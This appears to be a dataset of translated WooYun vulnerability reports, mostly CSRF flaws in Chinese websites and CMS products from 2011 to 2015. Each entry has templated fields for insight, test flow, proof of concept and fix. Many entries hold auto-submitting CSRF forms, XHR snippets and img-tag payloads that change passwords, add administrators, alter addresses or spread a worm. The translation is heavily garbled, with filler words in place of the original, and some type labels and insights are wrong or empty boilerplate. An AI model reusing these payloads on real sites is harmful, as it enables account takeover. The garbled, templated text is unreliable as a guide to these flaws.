**POC**: <html><head><title>163 weibo csrf test</title><script type="text/javascript">//follow mefunction addF(){document.getElementById("addF").submit();}//add twitterfunction addT(){document.getElementById("addT").submit();}</script></head><body onload="addF();addT();"><form target="addFF" id="addF" method

**Bypass**: Direct exploitation

**Fix**: checkreferer
---

---
### [wooyun-2013-020158] a certain social platformtextboost followersvulnerability,a certain social platformtexthastext
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textfounda certain Internet companytext peopleiweibo,goodtextlook atunder,forishasundertext!1)usea certain social platformaccountlog in,translated text peoplenottranslated textclicktextandcapture packets,onelook atIthentext,directlythenisGET;2)iniweiboonlook atlook at,datacompletelyallissamet.some-domain.comononetext,textthenistexttwo peoplesitedataissametext;thattextifiniweiboontexta certain personal,isnotist.some-domain.comontextthenwilltextthispersonal,text,thisiscanboost followerstext?3)good,Iiscomes fromwooyuntranslated text,thatthentextwooyuntextpointfollowers,putundertextlinkthrought.some-domain.compublishobtaintoshortaddress(texttotextgoodtranslated text);https://example.com/[redacted]

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: textisPOST
---

---
### [wooyun-2015-0112506] csrfaddadministrator
**Vendor**: phpshe.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: version:phpshe1.3latest version.otherversionnotest,textcheckadmin backendmanagementtext,addadministratorformnotokencausingcsrf

**POC**: nottextrecorded video.Itextcodeyouselftextunder.<form name="form1" action="http://[IP redacted] method="post"><input type="hidden" value="csrftest" name="info[admin_name]"></input><input type="hidden" value="csrftest" name="admin_pw"></input><input type="hidden"name="pesubmit" value="text text" cla

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2013-026768] a certain social platforma certain social platformone locationcsrfcanconstructworm
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.issuetextintextas follows:2.textoncontentclickpublishandcapture packetsgetdata;POST /event/emergencyRoom/send/process HTTP/1.1Host: tw.weibo.comUser-Agent:Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: https://example.com/[redacted] 61Cookie:Connection: keep-alivePragma:

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: youtext
---

---
### [wooyun-2015-0101573] translated textallsitemultiple locationsfunctional design flaw causescross-siterequest forgery(CSRF)#2(BypassX-CSRF-Tokenrestriction)
**Vendor**: huaban.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textallsitemultiple locationsfunctional design flaw causescross-siterequest forgery(CSRF)#2(BypassX-CSRF-Tokenrestriction).interface:https://example.com/[redacted]"err":403,"msg":"emailaddressnothas","_csrf":"*****"}thislocationpagereturnX-CSRF-Token,allsiteaboutCSRFdefenseputwilltextthisalltextnotext.

**POC**: textwithtextpoccode:<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="email" value="*********@some-domain.com"/></form><script>document.forms[0].submit();</script>

**Bypass**: filterBypass

**Fix**: textinterfacetextreturnX-CSRF-Token.
---

---
### [wooyun-2014-086159] PHPcloudtextpointsboost followerscsrftwolocation
**Vendor**: PHPYun talentsystem | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: one.filetext:https://example.com/[redacted] sava_ajaxresume_action(){$data['uid']=(int)$_POST['uid'];//translated textuid$data['title']='translated text';$data['content']=iconv("utf-8","gbk",$_POST['content']);//textcontent$data['fid']=$this->uid;$data['datetime']=time();$info['content']=$data['content'];$info['jobname']=iconv("utf-8","gbk",$_POST['jobname']);//translated text$info['use

**POC**: one.1.log incompanyaccountchecklook attranslated textis0 peopletextcompanypoints19764text2.textlog in,selfconstructpackettextinnouserlog instatus3.submitpackettextcompanypoints19752text,text12points4.log incompanyaccountsuccess,translated textcompanycanselfconstructtextselfsendtranslated texttwo.1.postcontentonlytexttwo peopleParameters,followtextuid,befollowtextid.these twoParametersallistranslated textvalue.2.user33notfollow113.sendpostpacket.33follow11log inchecklook at.textfollow4.again timessend   33cancelfollow11log inchecklook at .cancel

**Bypass**: Direct exploitation

**Fix**: Parameterstextsingle,Ilook atadministratoradmin backendhaspytoken,front endtextcanadd
---

---
### [wooyun-2015-0120438] texthearthandletextone locationcsrf
**Vendor**: xinli001.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: savetextlocationnotextvalidation.requestdatathennottexton,constructPOCcode is as follows:<html><head><title>CSRF POC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="nickname" value="wooyunorg"><input type="hidden" name="gender" value="male"><input type="hidden" name="birthday" value="2014-2

**Bypass**: Direct exploitation

**Fix**: addtokenvalidationoftext.
---

---
### [wooyun-2014-055111] a certain portal siteone locationcsrfvulnerability
**Vendor**: a certain portal site | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inVIPtranslated textinsidecangetdeletesectionurl...capture packetsdelete"No.onetext"- -

**POC**: inVIPtranslated textinsidecangetdeletesectionurl...capture packetsdelete"No.onetext"- -

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2011-01447] a certain emailservicesetforwardCSRF vulnerability
**Vendor**: a certain Internet company | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onlyhasSIDtoken,textsidiswithinURLin,iftextvictimemailsendtexthasonetexthastextforselfserveronimagetext,canexploitreferercomecollectsid,entertextenterlineenteronetextattack.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: inemailsettextaddToken
---

---
### [wooyun-2015-0116647] translated texttwotextcommunityBypasstokentextcsrf
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="nickname" value="&#x5C0F;&#x4E01;&#x4E01;&#x7206;&#x4E86;"/><!--thisisutf-8textcode,textnamelocation--><input type="hidde

**Bypass**: Direct exploitation

**Fix**: 1:tokenaddtranslated text..usertranslated textthentext..
---

---
### [wooyun-2015-0126842] translated textwebsitearbitrarychangetextshipping address(CSRF vulnerability)
**Vendor**: aokang.cn | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: look attoshipping address,textcapture packetslook at.textlook attovalidationtext.wecomeconstructpocwecometextquestionOK  success

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: addvalidationthencan
---

---
### [wooyun-2015-0104291] textmall systemtwolocationCSRFcanaddmanagement,modifyuserpassword
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: directlydownloadsource codetest  text 9.3twolocationCSRFtextcanadmin backendaddmanagementmodifyuserpassword

**POC**: modifypassword.capture packets foundnotokenconstructform<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="http://localhost:58898/saveuserinfo.asp?action=savepass" method="POST"><input type="hidden" name="userpassword" value="wuyun12" /><input type="hidden" name="userpassword2" value="wuyun12" /><input

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2013-045965] 115textone locationflashtextsecurityconfigurationnottextcancausinguserprivacyleakage(coordinatetexta certain scriptissue,exploittextlargetranslated text)
**Vendor**: translated texthastextcompany | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface, upload functionality

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: forfor115text,uploadswfiscanbehasserverondirectlytextquestion,storetextisstaticdl.115.com,andtextthisaddressiscaninnotlog inundercantextquestion(thistextistranslated textsecurityissue,textthislinktextistext,textotheronesometranslated textthistranslated text)issueismy.115.comundercrossdomain.xmlisthis way<allow-access-from domain="*.115.com"/>thattextweuploadfileiscantextquestionmy.115.comunderalltext..astextexploittext,hereagaintextundertextflashoneissue,flashvideointextputwhenandnotistextopen,textistexthasoneimage,clickaftertextput,butscriptinsideforonesometextwebsiteistranslated textput..isthis wayputline:"\\.(youku|56|ku6|kugou|tudou|sina|pptv|qiyi|a certain Internet company|xiami|yinyuetai)\\.(com|cn|net)"weonlytextintextadd.56.c

**POC**: shipping addressobtaincode

**Bypass**: Direct exploitation

**Fix**: text peoplemobile phonetranslated text..
---

---
### [wooyun-2013-035674] largetextcommunityforumtextlocationcsrfvulnerability
**Vendor**: largetextcommunity | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: notexttolocationtext,forisfound thistext.textURL:https://example.com/[redacted]

**POC**: inputaddresssuccesstext:thensuccesscancel:

**Bypass**: Direct exploitation

**Fix**: text.
---

---
### [wooyun-2015-0128677] translated textCSRF vulnerability
**Vendor**: jiwu.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="agent&#46;email" value="wooyun999&#64;163&#46;com" /><input type="hidden" name="agent&#46;districtId" value="22781" /><input type="hidden" name="agent&#46;streetId" value="0" /><input type="hidden" name="agent&#46;

**POC**: can modifyuseremailPOC<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="agent&#46;email" value="wooyun999&#64;163&#46;com" /><input type="hidden" name="agent&#46;districtId" value="22781" /><input type="

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-069712] translated textcsrfdeletearticlevulnerability
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: onlytranslated textpublishinformationidthen can,textidisalltextcantext.onlytranslated textpublishtextthislink:https://example.com/[redacted]

**POC**: opentextpageinurltextinputaddress,then can

**Bypass**: Direct exploitation

**Fix**: textrefererusepostrequest
---

---
### [wooyun-2013-043974] a certain Internet companytextcommentCSRFa certain social platformvulnerability
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: log instatustextquestion:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addtoken,translated textoneunder,ItextthissitetextisnotforCSRFtext,translated textmodifyshipping addresstext,textisthiswilltexta certain social platform,sotextcome.otherthennottext,textcloudsamesitesameTypevulnerabilityistextVendor,textheart!
---

---
### [wooyun-2013-033610] a certain e-commerce platformtextonecsrftextcantextfollow
**Vendor**: a certain e-commerce platformtext | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textfora certain e-commerce platformusernumbertextlarge,texthasNo.threetranslated textplatformcausingtextonebusinessissueallcancanforusercausenottext translated texta certain e-commerce platformcookiesissavetranslated text,thattextonetextgetcsrfcancanwilltranslated textuseraffectedforfora certain Vendorproducttextaftertextwillhasshortmessagetext,useVendoras an examplethencantextotherwebsiteora certain social platformsendtextcsrfhttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: thisissuetextthistextbusinesstextlook at,nottextsingletranslated textcomelook attextwillforusercauseonetranslated text,textwhencsrfdirectlyinone locationuseimageimgformtrigger,textwillhasonepoint
---

---
### [wooyun-2015-0127555] textnetworkCSRF vulnerability
**Vendor**: textnetwork | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] , causinguserunable todelete,add textdatatextcode,textaccountdatatextisthis way

**POC**: constructgoodPOC<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="a" value="save" /><input type="hidden" name="delivery&#95;name" value="&#37;u963F&#37;u8428&#37;u8FBE" /><input type="hidden" name="s&#95;province" value="&#37;u5929&#37;u6D25&#37;u5E02" /><i

**Bypass**: Direct exploitation

**Fix**: you know what to do
---

---
### [wooyun-2011-03058] SAE CSRF
**Vendor**: a certain social platform | **Year**: 2011 | **Type**:

**Meta-thinking**: Trigger signal: functional testing

**Insight**:  lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify -related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: sae.sina.com.cn/?m=coopmng&a=invite&app_id=wooyun&to_invite=someone@somedomain.com&role=other&priv[]=priv_deploy&inviteWords=hi,dude.inwooyuntextimagetextthislink,ortext.

**POC**: <img src="sae.sina.com.cn/?m=coopmng&a=invite&app_id=wooyun&to_invite=someone@somedomain.com&role=other&priv[]=priv_deploy&inviteWords=hi,dude." />

**Bypass**: Direct exploitation

**Fix**: translated textoperationneedonetoken.
---

---
### [wooyun-2015-0122917] translated texta certain sitehassqlinjection
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: injectionpoint:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: textcheckcheck.
---

---
### [wooyun-2012-015221] a certain sports communityforumCSRFunicode-202E.
**Vendor**: a certain sports communitysports site | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2013-020979] 360web directorypersonaltextcsrfvulnerability
**Vendor**: a certain security vendor | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: personalinhearthttps://example.com/[redacted] textcloudhttps://example.com/[redacted] opentextsuccesthenreturnpersonalinheart

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: 360text
---

---
### [wooyun-2013-020652] a certain social platformnorestrictionboost followers,cantext
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textquestionuseunderurlthen canfollowthistexthttps://example.com/[redacted]

**POC**: textquestionuseonurldirectlythenfollowhttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: 1,textgoodtextPOSTmethod2,iftextuseGETmethod,shouldaddtexttoken
---

---
### [wooyun-2014-068794] textItexta subsitecsrfcanboost followers
**Vendor**: textItext | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: clickfollow capture packets directlygetrequesttextalltextvalidation

**POC**: kzone.kuwo.cn/mlog/Follow?act=add&referId=149941230followsuccess return200 failed302

**Bypass**: Direct exploitation

**Fix**: addvalidationcode
---

---
### [wooyun-2013-022700] thinksnslatest versiona certain social platformone locationmisconfigurationcantextsendlargetextworm
**Vendor**: ThinkSNS | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: homepagesenda certain social platformlocationnotvalidationtoken,causingcanthroughonetextheartconstructformtextusersendonetexthaslinka certain social platform,clicklinkafterusertextwilltextsametext,onetextten,tentext,putwilltextsendlargetextworm.

**POC**: POC:<html><body><form name="csrf" action="https://example.com/[redacted]" method="POST"><input type=text name=body value="textdo not knowaboutthinksnstextpassword:https://example.com/[redacted]"></input><input type=text name=app_name value="public"></input><input type=text na

**Bypass**: Direct exploitation

**Fix**: operationtextaddtexttokentext20rank,requesting a reward
---

---
### [wooyun-2013-025472] a certain social platformmultiple locationsGetCsrfdeletemessagebindmobile phonenumber
**Vendor**: a certain portal site | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]  deletetexthttps://example.com/[redacted]  deletesystemmessagehttps://example.com/[redacted] bindmobile phonenumber

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: translated textnottranslated textFix
---

---
### [wooyun-2015-0129047] texta systemone locationtextvulnerabilitycan modifyuserpassword(demotext)
**Vendor**: fanwe.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: https://example.com/[redacted] charset="utf-8"/><title>csrf poc</title></head><body><form action="https://example.com/[redacted]" method="pos

**Bypass**: Direct exploitation

**Fix**: textrank,rewardintextinside.
---

---
### [wooyun-2015-0109911] uca certain sitecsrfmodifyuserinformation
**Vendor**: UC Mobile | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: <form  target="frame_profile" enctype="multipart/form-data" method="post" action="https://example.com/[redacted]"><input type="hidden" name="formhash" value="6a12255c"><table cellspacing="0" cellpadding="0" id="profilelist" class="tfm"><tbody><tr><th>usernamed</th><td>assfffg</td

**Bypass**: Direct exploitation

**Fix**: tokenortextreferer
---

---
### [wooyun-2014-088099] onetextemailthen cancontrol21cnuseremailtextafteremail
**Vendor**: 21CN | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 21CNwebsiteemailsystemhasmanylargetextvulnerability,successsametextexploitthisseveraltextvulnerabilitytextcauseseriousissue.vulnerabilityone:forHTMLcodefilternottext,causingcantranslated textHTMLcodevulnerabilitytwo:textoperationnoTOKEN,textnotvalidationGET/POSTrequestcausingCSRFattackcodecan refer totestcode

**POC**: usearbitraryemailtext21CNemailsendtextonetextemailuserclickthisemailthen cantranslated textonetextemailtext,texthijackuseremail.

**Bypass**: Direct exploitation

**Fix**: vulnerabilityone:forHTMLcodeenterlinetextastranslated textnamedsinglefilterandoutputtextcodevulnerabilitytwo:textoperationneedhasToken,textCSRFattack.
---

---
### [wooyun-2015-0128683] translated textcsrfvulnerability
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: entersetinheart,modifyuserpersonalinformation:checklook atdatapacket:canlook atto,nonotcantextParameters,translated textmaliciouslink,main code:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickName=wo55551&gender=2&birthday=2015-02-04&realName=%E5%BC%A0%E4%B8%89&domicileId=110103&address=fdgfdahet&zip=111111&telephone=13

**POC**: poc########textmaliciouslink,main code:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("nickName=wo55551&gender=2&birthday=2015-02-04&realName=%E5

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtoken
---

---
### [wooyun-2015-0155729] translated textarbitraryaccountpasswordreset
**Vendor**: vcash.cn | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] https://example.com/[redacted] HTTP/1.1Host: www.vcash.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Acce

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: addtextvalidation
---

---
### [wooyun-2015-0124972] translated textCSRFmodifyshipping address
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: ~~

**POC**: <html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="consignee&#95;name" value="?&#142;&#187;?&#142;&#187;?&#142;&#187;" /><input type="hidden" name="phone" value="18888888888" /><input type="hidden" name="province" value="15" /><input type="hidde

**Bypass**: Direct exploitation

**Fix**: tokenvalidationtext
---

---
### [wooyun-2015-0100229] YOHO!hastextofficialwebsitea certain functional design flaw causescross-siterequest forgery(CSRF)(withtextpoc)
**Vendor**: YOHO!hastext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: YOHO!hastextofficialwebsitesave addresstextinterfacetextcausingcross-siterequest forgery(CSRF)(withtextpoc).

**POC**: poc:<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>CSRFcross-siterequest forgerysecurityvulnerabilityPOC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="addressee_name" value="textcloud@translated text"/><input type="hidden" name="address" value=

**Bypass**: Direct exploitation

**Fix**: 1.CAPTCHA is considered a defense againstCSRFattacks and the simplest effective defensive method.2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2012-012968] PHPWIND 8.7 mobile version CSRF
**Vendor**: a certain forumsystem | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: mobile version"text"linkas index.php?a=quitpostcontenttext:[img]http://xxxxxxx/m/index.php?a=quit[/img]look attextaftertextbetext

**POC**: localtestsuccesstext

**Bypass**: Direct exploitation

**Fix**: textunderdiscuz,add aformhash
---

---
### [wooyun-2014-062848] MetInfotranslated textcausingdeletetextsiteetc.seriousvulnerabilityall versionsuniversal
**Vendor**: cncertNational Internet Emergency Center | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: upload functionality, admin backendmanagement

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thatofficiallatest versionmetinfo5.2test!No.one location:arbitrarydirectorydeletefiletextin/admin/system/uploadfile.php<?php# MetInfo Enterprise Content Management System# Copyright (C) MetInfo Co.,Ltd (https://example.com/[redacted]). All rights reserved.require_once '../login/login_check.php';require_once 'mydir.class.php';$rurls='../system/uploadfile.php?anyid='.$anyid.'&cs='.$cs.'&lang='.$lang;if($action=='deletefolder'){$filedir="../../".$filename;deldir($fi

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: controldeletedirectory.addCSRF Token
---

---
### [wooyun-2015-0118491] Aili.comvulnerabilitysmall package(multiple locationscsrf)
**Vendor**: aili.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: 1.Aili.comvulnerabilitysmall package(two),textVendorItextcome!textifthennottext,oneGETsubmitmethodCSRF vulnerability.textblog postaddress:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: textVendor.textgood,texton timestextItextmethodnottexthearttextIpointtodelete,textagaintextone times!
---

---
### [wooyun-2014-053771] Discuz! X2.5 / X3 / X3.1inCSRFattackdefensecanbeBypass
**Vendor**: Discuz! | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: discuzintextformtextusethisfunction:submitcheck('submit', true)itsinNo.twoParameterscopycomeshouldiswhethertextGETrequesttext.inX2.5 / X3 / X3.1in,No.twoParametersastruetranslated textnottextformhashdirectlyreturn true......usetextsearchtoolsearchdiscuztextcodeinsidesubmitcheck(*, *)......thenfoundofficialtextusethis kind oftext,translated textX2andbeforealltextlook attext,nottextwhetherhasissue. IlocalX2.5 X3 X3.1thisfiletextcopyallonetext......

**POC**: source/class/helper/helper_form.phpLine 22if($allowget || ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_GET['formhash']) && $_GET['formhash'] == formhash() && empty($_SERVER['HTTP_X_FLASH_VERSION']) && (empty($_SERVER['HTTP_REFERER']) ||preg_replace("/https?:\/\/([^\:\/]+).*/i", "\\1", $_SERVER[

**Bypass**: Direct exploitation

**Fix**: textsingletext,modifyunderthistranslated text
---

---
### [wooyun-2015-0135490] textlineone locationcsrfcan modifyuserinformation/textuseaddress/textusetranslated textetc.
**Vendor**: ilvxing.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifypersonalinformationlocationnotaddtokenvalidation,textnotvalidationreferconstructpoc<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="phone" value="13088643071" /><input type="hidden" name="email" value="1&#64;q&#46;cc" /><input type="hidden" name="old&#95;password" value="" /><input type="hidden" name="new&#95;password" value="" /><input type="hidden" name="new&#95;password&#95;c

**POC**: (see original)

**Bypass**: Direct exploitation

